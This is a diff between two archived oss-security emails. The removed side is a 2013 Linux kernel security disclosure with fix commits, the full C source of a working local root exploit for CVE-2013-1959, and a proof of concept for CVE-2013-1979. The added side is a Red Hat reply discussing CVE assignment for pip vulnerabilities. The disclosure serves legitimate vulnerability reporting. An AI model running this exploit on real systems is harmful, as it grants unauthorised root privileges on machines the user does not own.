@@ -1,250 +1,126 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/29/1
-Message-ID: <CALCETrVLGET46VOL7SWmeCJU9GxDtMoqu-k_DsN8+gU=bLxC-w@mail.gmail.com>
-Date: Sun, 28 Apr 2013 19:23:46 -0700
-From: Andy Lutomirski <luto@...capital.net>
-To: linux-kernel@...r.kernel.org, oss-security@...ts.openwall.com
-Subject: Multiple Linux setuid output redirection vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/07/30/6
+Message-ID: <51F75D52.9070902@redhat.com>
+Date: Tue, 30 Jul 2013 00:29:38 -0600
+From: Kurt Seifried <kseifried@...hat.com>
+To: oss-security@...ts.openwall.com
+CC: Donald Stufft <donald@...fft.io>, isis@...project.org, cve-assign@...re.org
+Subject: Re: Requesting CVE-ID(s) for Python's pip
 Content-Type: text/plain; charset=utf-8
 
-Some of the recent -stable patches are (surprise!) security fixes.
-These were disclosed on the distros list last week.
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
 
-CVE-2013-1959: /proc/<pid>/uid_map has multiple incorrect privilege checks
+On 07/26/2013 09:46 AM, Donald Stufft wrote:
+> 
+> On Jul 26, 2013, at 8:03 AM, isis agora lovecruft
+> <isis@...project.org> wrote:
+> 
+>> I would also like to request CVE assignment(s) for two issues in
+>> pip (https://github.com/pypa/pip/), related to Donald Stufft's.
+>> 
+>> First issue: ------------ Python's pip versions 1.4.x and earlier
+>> are vulnerable to an Arbitrary Code Execution Attack due to
+>> incorrect regexp parsing of external download links in the
+>> following functions in pip/index.py:
+>> 
+>> * PackageFinder._get_pages()
+>> https://github.com/pypa/pip/blob/1.3.X/pip/index.py#L232 *
+>> PackageFinder._sort_links()
+>> https://github.com/pypa/pip/blob/1.3.X/pip/index.py#L272 *
+>> PackageFinder._package_versions()
+>> https://github.com/pypa/pip/blob/1.3.X/pip/index.py#L285 *
+>> PackageFinder._link_package_versions()
+>> https://github.com/pypa/pip/blob/1.3.X/pip/index.py#L290
+>> 
+>> Which allow an attacker with the ability to Man-in-the-Middle
+>> external package URIs (which often include external HTTP URIs,
+>> and can include the module author's personal website, see 
+>> https://github.com/pypa/pip/commit/a3584d176697bd4c83390de1857679d44389e00d#L0L265)
+>>
+>> 
+to specify an arbitrarily high package version number and gain code
+>> execution.
+>> 
+>> Uptream bugtracker reports:
+>> https://github.com/pypa/pip/issues/425#issuecomment-20639993 
+>> https://github.com/pypa/pip/issues/425#issuecomment-20640890
+>> 
+>> Other mentions:
+>> https://github.com/pypa/pip/commit/9ccd5f0bb37508f03e6a19be58af7384eede2157
+>>
+>> 
+https://paste.debian.net/7309/
+>> 
+>> This issue is fixed in pip>=1.5.x by Donald Stufft in the
+>> following commits: 
+>> https://github.com/pypa/pip/commit/0e1da584f418ae0088b43d01248572e2ff53d3a1
+>>
+>> 
+https://github.com/pypa/pip/commit/9ccd5f0bb37508f03e6a19be58af7384eede2157
+> 
+> I'm not sure I understand this one. Is this just the external urls?
+> Technically it wasn't a problem with the regexp's they worked fine.
+> It was just bad behavior inherited from legacy systems. 1.4.x
+> defaults to allowing them but enables people to turn them off,
+> 1.5.x will disallow them by default.
+> 
+> 1.3.x and earlier allowed them and offered no way to disable them.
 
-Linux 3.8 and various 3.9 rcs are affected, depending on
-configuration.  This gives a root shell.  (Actually, it gives a uid 0
-shell with no capabilities, but that's easy to escalate to full root.)
+So it sounds like 1.3.x was definitely vulnerable to this with no way
+to disable it, 1.4 was vulnerable by default but could be made safe,
+and 1.5 is vulnerable but safe by default, is that correct?
 
-Fixed by:
+>> 
+>> Second issue: ------------- Python's pip versions 1.5.x and
+>> earlier use MD5 hashes for verification of package integrity
+>> against PyPI (which defaults to providing MD5).
+> 
+> Strictly speaking pip doesn't default to any hash. It just uses the
+> hash given to it. Prior to 1.2 it only allowed MD5 but since the
+> release of 1.2 it has allowed any of the guaranteed hashes in
+> python's hash lib.
+> 
+> See: https://github.com/pypa/pip/pull/467
+> 
+> Setuptools has also historically only allowed MD5 but has recently
+> with version 0.9+ enabled similar abilities to setuptools to enable
+> the use of any available hashes as well. Distribute (a fork of
+> setuptools which has now been merged back into setuptools) only
+> supports MD5 in it's older releases.
 
-commit 935d8aabd4331f47a89c3e1daa5779d23cf244ee
-Author: Linus Torvalds <torvalds@...ux-foundation.org>
-Date:   Sun Apr 14 10:06:31 2013 -0700
-
-    Add file_ns_capable() helper function for open-time capability checking
-
-commit 6708075f104c3c9b04b23336bb0366ca30c3931b
-Author: Eric W. Biederman <ebiederm@...ssion.com>
-Date:   Sun Apr 14 13:47:02 2013 -0700
-
-    userns: Don't let unprivileged users trick privileged users into
-setting the id_map
-
-commit e3211c120a85b792978bcb4be7b2886df18d27f0
-Author: Andy Lutomirski <luto@...capital.net>
-Date:   Sun Apr 14 16:28:19 2013 -0700
-
-    userns: Check uid_map's opener's fsuid, not the current fsuid
-
-All three patches are needed.
-
-
-There's an exploit at the bottom of this email.  To use it, you need
-to supply the program "zerozeroone".  Doing so is left as an exercise
-to the reader.  It can be done on stock installs of Fedora and Ubuntu
-at least.
+I'm not sure in this case MD5 alone is a security vulnerability, I
+think previously it had been decided that just because it uses MD5
+wasn't ernough to get a CVE, it had to have some specific use that
+made MD5 a problem. OTOH DES is at this point worthy of a CVE since
+you can crack it in a reasonable amount of time on AWS/etc for a few
+hundred bucks or less. Personally I would assign a CVE to everything
+using MD5 by default to try and help kill it off, but that would be a
+lot of CVEs.
 
 
-
-CVE-2013-1979: writes to unix sockets capture euid instead of uid
-
-This appears to be a regression in 2.6.36, and the regression was
-backported to various older stable series (2.6.35.11 at least).  It is
-almost certainly exploitable for root on most distributions, although
-the vectors will vary.  The fix is:
-
-commit 83f1b4ba917db5dc5a061a44b3403ddb6e783494
-Author: Linus Torvalds <torvalds@...ux-foundation.org>
-Date:   Fri Apr 19 15:32:32 2013 +0000
-
-    net: fix incorrect credentials passing
+> ----------------- Donald Stufft PGP: 0x6E3CBCE93372DCFA // 7C6B
+> 7C5D 5E2B 6356 A926 F04F 6E3C BCE9 3372 DCFA
+> 
 
 
-I don't have an exploit, but there's a PoC below that demonstrates the issue.
+- -- 
+Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.13 (GNU/Linux)
 
-
-
-There's another security buglet that probably has extremely low
-impact.  It doesn't have (and shouldn't need) a CVE number.  It's
-fixed here:
-
-commit 41c21e351e79004dbb4efa4bc14a53a7e0af38c5
-Author: Andy Lutomirski <luto@...capital.net>
-Date:   Sun Apr 14 11:44:04 2013 -0700
-
-    userns: Changing any namespace id mappings should require privileges
-
-
-
---- Begin CVE-2013-1959 exploit ---
-/* userns_root_sploit.c by */
-/* Copyright (c) 2013 Andrew Lutomirski.  All rights reserved. */
-/* You may use, modify, and redistribute this code under the GPLv2. */
-
-#define _GNU_SOURCE
-#include <unistd.h>
-#include <sched.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sys/mman.h>
-#include <fcntl.h>
-#include <stdio.h>
-#include <string.h>
-#include <err.h>
-#include <linux/futex.h>
-#include <errno.h>
-#include <unistd.h>
-#include <sys/syscall.h>
-
-#ifndef CLONE_NEWUSER
-#define CLONE_NEWUSER 0x10000000
-#endif
-
-pid_t parent;
-int *ftx;
-
-int childfn()
-{
-  int fd;
-  char buf[128];
-
-  if (syscall(SYS_futex, ftx, FUTEX_WAIT, 0, 0, 0, 0) == -1 &&
-      errno != EWOULDBLOCK)
-    err(1, "futex");
-
-  sprintf(buf, "/proc/%ld/uid_map", (long)parent);
-  fd = open(buf, O_RDWR | O_CLOEXEC);
-  if (fd == -1)
-    err(1, "open %s", buf);
-  if (dup2(fd, 1) != 1)
-    err(1, "dup2");
-
-  // Write something like "0 0 1" to stdout with elevated capabilities.
-  execl("./zerozeroone", "./zerozeroone");
-
-  return 0;
-}
-
-int main(int argc, char **argv)
-{
-  int dummy, status;
-  pid_t child;
-
-  if (argc < 2) {
-    printf("usage: userns_root_sploit COMMAND ARGS...\n\n"
-           "This will run a command as (global) uid 0 but no capabilities.\n");
-    return 1;
-  }
-
-  ftx = mmap(0, sizeof(int), PROT_READ | PROT_WRITE,
-             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-  if (ftx == MAP_FAILED)
-    err(1, "mmap");
-
-  parent = getpid();
-
-  if (signal(SIGCHLD, SIG_DFL) != 0)
-    err(1, "signal");
-
-  child = fork();
-  if (child == -1)
-    err(1, "fork");
-  if (child == 0)
-    return childfn();
-
-  *ftx = 1;
-  if (syscall(SYS_futex, ftx, FUTEX_WAKE, 1, 0, 0, 0) != 0)
-    err(1, "futex");
-
-  if (unshare(CLONE_NEWUSER) != 0)
-    err(1, "unshare(CLONE_NEWUSER)");
-
-  if (wait(&status) != child)
-    err(1, "wait");
-  if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
-    errx(1, "child failed");
-
-  if (setresuid(0, 0, 0) != 0)
-    err(1, "setresuid");
-  execvp(argv[1], argv+1);
-  err(1, argv[1]);
-
-  return 0;
-}
---- End CVE-2013-1959 exploit ---
-
---- Begin CVE-2013-1979 PoC ---
-/* socket_problem.c - PoC for an SCM_CREDENTIALS issue
- *
- * Actually exploiting something is left as an exercise for the reader.
- *
- * Copyright (c) 2013 Andrew Lutomirski.  All rights reserved.
- * You may use, modify, and redistribute this code under the GPLv2.
- */
-
-#define _GNU_SOURCE
-#include <unistd.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-#include <stdio.h>
-#include <string.h>
-#include <err.h>
-#include <unistd.h>
-
-int child(int fd)
-{
-  if (dup2(fd, 2) != 2)
-    err(1, "dup2");
-  execlp("su", "evil payload\n", "-U", "nonexistentuser", NULL);
-  err(1, "execlp");
-  return 1;
-}
-
-int main()
-{
-  printf("[PoC for an SCM_CREDENTIALS issue]\n");
-  int sockets[2];
-  if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, sockets) != 0)
-    err(1, "socketpair");
-
-  int one = 1;
-  if (setsockopt(sockets[0], SOL_SOCKET, SO_PASSCRED, &one, sizeof(one)) != 0)
-    err(1, "SO_PASSCRED");
-
-  if (fork() == 0)
-    return child(sockets[1]);
-
-  char buf[4097];
-  char cbuf[CMSG_SPACE(sizeof(struct ucred))];
-  struct iovec iov;
-  iov.iov_base = &buf;
-  iov.iov_len = sizeof(buf);
-  struct msghdr hdr;
-  memset(&hdr, 0, sizeof(hdr));
-  hdr.msg_iov = &iov;
-  hdr.msg_iovlen = 1;
-  hdr.msg_control = cbuf;
-  hdr.msg_controllen = sizeof(cbuf);
-  ssize_t bytes = recvmsg(sockets[0], &hdr, 0);
-  if (bytes < 0)
-    err(1, "recvmsg");
-
-  printf("Received %ld bytes\n", (long)bytes);
-
-  for (struct cmsghdr *cmsg = CMSG_FIRSTHDR(&hdr); cmsg; cmsg =
-CMSG_NXTHDR(&hdr, cmsg)) {
-    if (cmsg->cmsg_level == SOL_SOCKET &&
-        cmsg->cmsg_type == SCM_CREDENTIALS) {
-      struct ucred *cred = (struct ucred *)CMSG_DATA(cmsg);
-      printf("SCM_CREDENTIALS: uid=%ld, gid=%ld, pid=%ld\n",
-             (long)cred->uid, (long)cred->gid, (long)cred->pid);
-    }
-  }
-
-  buf[bytes] = 0;
-  printf("Payload: %s\n[PoC exiting]\n", buf);
-  return 0;
-}
---- End CVE-2013-1979 PoC ---
+iQIcBAEBAgAGBQJR911SAAoJEBYNRVNeJnmTViYQALHzY4DGMcJJRl6Fj6kU5HHl
+H2Ck/4uNH6a1q95jy/MFNja2MiUrMlqay2FJ2G+2pOmCnxf81DjFLkHnjZb4/8XU
+rxiIsbZmMl0saoL3/smxX4oImDdaB7OuNNQ5/yOzMKJxjDdEhpBUc5sWtABNbKZw
+CXWmsrgdVRluRWBjn5IwUua+1D+5KddiYaTvbKNkT2UYqHa/k00Ra2S8oA8dW2PF
+Zladxs6Y+7PZK/7EP+3ADlzKwxxuLPh8eZVSLwAqu0DMk/nnM6U1pPS+cjKVKHgi
+Pp0bTMCzkGrLTJH2wwmwLSGvg8mbm7xf0XAprYRhLs7gVKXvZXuB99BqLQ0gBR4P
+VrfoTL2Rn+ZeLtlxWeI1Ra/nWmuxu1Tg3DxwKPb4tbDBEkFKtmUgNjRBxho2/s/x
+nZgrHt/F7+Nt6Y8MHVYi6ijNGTv1dOREl97tj2kHa+kQxF0mJyymJEFS4Be5bj38
+HroCxQFjpF3ymhZ5NTavoQ0CQg31Hey9PTQBBPhoZ7GK1JyLaEJtTQK5mNHWT2Rv
+KOxz5frh+/iy1k1Z/xERC5AUkyZkbIevvpY+0eO3n5lCVcjtDXc+0zz5J/c6YkJl
+ngEGZ69CWLffzlCXIjciNYLquNWbdPwQhJS8c6fbCOAeaK74b3xOHWsCnQO1ruw7
++ucujVQ2caHeU84axyOk
+=dj3J
+-----END PGP SIGNATURE-----
